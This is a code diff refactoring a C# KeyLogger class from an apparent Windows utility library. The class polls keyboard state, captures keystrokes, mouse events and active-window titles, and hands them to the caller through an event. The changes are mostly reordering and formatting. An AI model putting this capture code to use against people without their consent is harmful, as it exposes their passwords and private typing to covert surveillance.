@@ -1,13 +1,12 @@
 ﻿using System;
-using System.Text;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 
 namespace Argus.Windows.Hardware
 {
-
     /// <summary>
-    /// An event driven key logger with support for including the active window caption when it changes.
+    ///     An event driven key logger with support for including the active window caption when it changes.
     /// </summary>
     /// <code>
     /// // WinForms Example
@@ -45,6 +44,49 @@ namespace Argus.Windows.Hardware
         //
         //*********************************************************************************************************************
 
+        private readonly object _messagesLock = new object();
+
+        // To detect redundant calls
+        private bool _disposedValue;
+        private Thread _logThread;
+
+        /// <summary>
+        ///     Constructor
+        /// </summary>
+        public KeyLogger()
+        {
+            _logThread = new Thread(this.ReadKeyboard);
+        }
+
+        /// <summary>
+        ///     The Priority of the key logging thread.
+        /// </summary>
+        public ThreadPriority ThreadPriority
+        {
+            get => _logThread.Priority;
+            set => _logThread.Priority = value;
+        }
+
+        /// <summary>
+        ///     Whether or not to include the current caption of the active window when it changes
+        ///     in the buffer.
+        /// </summary>
+        public bool IncludeCurrentWindowCaption { get; set; } = true;
+
+        /// <summary>
+        ///     Whether or not to include mouse information when logging text.  The default value for this property is False.
+        /// </summary>
+        public bool IncludeMouseEvents { get; set; } = false;
+
+        /// <summary>
+        ///     Disposes of resources.
+        /// </summary>
+        public void Dispose()
+        {
+            this.Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
         [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
         private static extern short GetAsyncKeyState(int vKey);
 
@@ -60,31 +102,23 @@ namespace Argus.Windows.Hardware
         [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
         private static extern int GetParent(int hwnd);
 
+        /// <summary>
+        ///     Event handler that's raised when data is received.
+        /// </summary>
         public event EventHandler<InputEventArgs> DataReceived;
 
-        private readonly object _messagesLock = new object();
-        private Thread _logThread;
-
         /// <summary>
-        /// Constructor
-        /// </summary>
-        public KeyLogger()
-        {
-            _logThread = new Thread(new ThreadStart(this.ReadKeyboard));
-        }
-
-        /// <summary>
-        /// Method to raise the DataReceived event.
+        ///     Method to raise the DataReceived event.
         /// </summary>
         /// <param name="e"></param>
         protected virtual void OnDataReceived(InputEventArgs e)
         {
-            var handler = DataReceived;
+            var handler = this.DataReceived;
             handler?.Invoke(this, e);
         }
 
         /// <summary>
-        /// Starts the key logger thread.
+        ///     Starts the key logger thread.
         /// </summary>
         public void Start()
         {
@@ -92,16 +126,16 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// Stops the key logger thread.
+        ///     Stops the key logger thread.
         /// </summary>
         public void Stop()
         {
             _logThread.Abort();
-            _logThread = new Thread(ReadKeyboard);
+            _logThread = new Thread(this.ReadKeyboard);
         }
 
         /// <summary>
-        /// Whether or not the key logging thread is still active.
+        ///     Whether or not the key logging thread is still active.
         /// </summary>
         public bool StillActive()
         {
@@ -109,7 +143,7 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// Reads input from the keyboard.
+        ///     Reads input from the keyboard.
         /// </summary>
         private void ReadKeyboard()
         {
@@ -123,12 +157,12 @@ namespace Argus.Windows.Hardware
                     string key = "";
 
                     // Get the window text and remove any null characters
-                    windowText = GetActiveWindowTitle(false);
+                    windowText = this.GetActiveWindowTitle(false);
                     windowText = windowText.Replace("\0", "");
 
-                    if (this.IncludeCurrentWindowCaption == true)
+                    if (this.IncludeCurrentWindowCaption)
                     {
-                        if (windowText != _lastWindowText & !string.IsNullOrEmpty(windowText))
+                        if ((windowText != _lastWindowText) & !string.IsNullOrEmpty(windowText))
                         {
                             key += $"[Window: {windowText}] \r\n\r\n";
                             _lastWindowText = windowText;
@@ -151,7 +185,6 @@ namespace Argus.Windows.Hardware
                             case 1:
                                 if (this.IncludeMouseEvents == false)
                                 {
-                                    break;
                                 }
                                 else
                                 {
@@ -162,7 +195,6 @@ namespace Argus.Windows.Hardware
                             case 2:
                                 if (this.IncludeMouseEvents == false)
                                 {
-                                    break;
                                 }
                                 else
                                 {
@@ -177,7 +209,6 @@ namespace Argus.Windows.Hardware
                             case 4:
                                 if (this.IncludeMouseEvents == false)
                                 {
-                                    break;
                                 }
                                 else
                                 {
@@ -188,7 +219,6 @@ namespace Argus.Windows.Hardware
                             case 5:
                                 if (this.IncludeMouseEvents == false)
                                 {
-                                    break;
                                 }
                                 else
                                 {
@@ -199,7 +229,6 @@ namespace Argus.Windows.Hardware
                             case 6:
                                 if (this.IncludeMouseEvents == false)
                                 {
-                                    break;
                                 }
                                 else
                                 {
@@ -535,7 +564,7 @@ namespace Argus.Windows.Hardware
 
                                             break;
                                         default:
-                                            key += Convert.ToString((char)i).ToUpper();
+                                            key += Convert.ToString((char) i).ToUpper();
 
                                             break;
                                     }
@@ -585,14 +614,14 @@ namespace Argus.Windows.Hardware
                                         case 106:
                                         case 111:
                                             //We don't want to show a shift with caps lock and numbers
-                                            key += (char)i;
+                                            key += (char) i;
 
                                             break;
                                         case 20:
                                             break;
                                         // do nothing
                                         default:
-                                            key += Convert.ToString((char)i).ToUpper();
+                                            key += Convert.ToString((char) i).ToUpper();
 
                                             break;
                                     }
@@ -600,7 +629,7 @@ namespace Argus.Windows.Hardware
                                 else
                                 {
                                     // No Shift
-                                    key += Convert.ToString((char)i).ToLower();
+                                    key += Convert.ToString((char) i).ToLower();
                                 }
 
                                 break;
@@ -615,9 +644,8 @@ namespace Argus.Windows.Hardware
                             Text = key
                         };
 
-                        OnDataReceived(e);
+                        this.OnDataReceived(e);
                     }
-
                 }
 
                 Thread.Sleep(1);
@@ -625,7 +653,7 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// Whether the right or left shift key is down (or caps lock is down).
+        ///     Whether the right or left shift key is down (or caps lock is down).
         /// </summary>
         public bool IsShiftDown()
         {
@@ -646,7 +674,7 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// Whether or not the caps lock key is down.
+        ///     Whether or not the caps lock key is down.
         /// </summary>
         /// <remarks>TODO: This doesn't work</remarks>
         public bool IsCapsLockDown()
@@ -662,7 +690,7 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// Returns the title/caption of the active window.
+        ///     Returns the title/caption of the active window.
         /// </summary>
         /// <param name="returnParent">If true returns the parent's window title.</param>
         public string GetActiveWindowTitle(bool returnParent)
@@ -681,18 +709,16 @@ namespace Argus.Windows.Hardware
                 i = j;
             }
 
-            return GetWindowTitle(i);
+            return this.GetWindowTitle(i);
         }
 
         /// <summary>
-        /// Returns the window title/caption given a handle.
+        ///     Returns the window title/caption given a handle.
         /// </summary>
         /// <param name="hwnd"></param>
         public string GetWindowTitle(int hwnd)
         {
-            int l = 0;
-
-            l = GetWindowTextLength(hwnd);
+            int l = GetWindowTextLength(hwnd);
             var sb = new StringBuilder(l);
 
             GetWindowText(hwnd, sb, l + 1);
@@ -701,7 +727,7 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// Formats text for a provided event name.
+        ///     Formats text for a provided event name.
         /// </summary>
         /// <param name="eventName"></param>
         /// <param name="eventText"></param>
@@ -711,28 +737,27 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// Remove the backspace character string and the character previous to it.  Note, this doesn't work well if processed over 
-        /// an entire log of text since intermittent backspaces can be processed, say if a window changes and then changes back where
-        /// the context changes (e.g. you jump from one text box to another).
+        ///     Remove the backspace character string and the character previous to it.  Note, this doesn't work well if processed over
+        ///     an entire log of text since intermittent backspaces can be processed, say if a window changes and then changes back where
+        ///     the context changes (e.g. you jump from one text box to another).
         /// </summary>
         /// <param name="text"></param>
         public static string CleanupBackspaces(string text)
         {
-
             if (string.IsNullOrEmpty(text))
             {
                 return text;
             }
 
             // Replace the verbose backspace with the backspace character
-            string bs = Convert.ToString((char)8);
+            string bs = Convert.ToString((char) 8);
             text = text.Replace("[BkSp] ", bs);
 
             var result = new StringBuilder(text.Length);
 
             foreach (char c in text)
             {
-                if ((int)c == 8)
+                if (c == 8)
                 {
                     if (result.Length > 0)
                     {
@@ -749,32 +774,12 @@ namespace Argus.Windows.Hardware
         }
 
         /// <summary>
-        /// The Priority of the key logging thread.
+        /// Disposes of resources.
         /// </summary>
-        public ThreadPriority ThreadPriority
-        {
-            get { return _logThread.Priority; }
-            set { _logThread.Priority = value; }
-        }
-
-        /// <summary>
-        /// Whether or not to include the current caption of the active window when it changes
-        /// in the buffer.
-        /// </summary>
-        public bool IncludeCurrentWindowCaption { get; set; } = true;
-
-        /// <summary>
-        /// Whether or not to include mouse information when logging text.  The default value for this property is False.
-        /// </summary>
-        public bool IncludeMouseEvents { get; set; } = false;
-
-        // To detect redundant calls
-        private bool _disposedValue = false;
-
-        // IDisposable
+        /// <param name="disposing"></param>
         protected virtual void Dispose(bool disposing)
         {
-            if (!this._disposedValue)
+            if (!_disposedValue)
             {
                 if (disposing)
                 {
@@ -784,29 +789,17 @@ namespace Argus.Windows.Hardware
                         _logThread = null;
                     }
                 }
-
-
             }
-            this._disposedValue = true;
-        }
 
-        /// <summary>
-        /// Disposes of resources.
-        /// </summary>
-        public void Dispose()
-        {
-            Dispose(true);
-            GC.SuppressFinalize(this);
+            _disposedValue = true;
         }
-
     }
 
     /// <summary>
-    /// Input Event Arguments
+    ///     Input Event Arguments
     /// </summary>
     public class InputEventArgs : EventArgs
     {
         public string Text { get; set; }
     }
-
 }
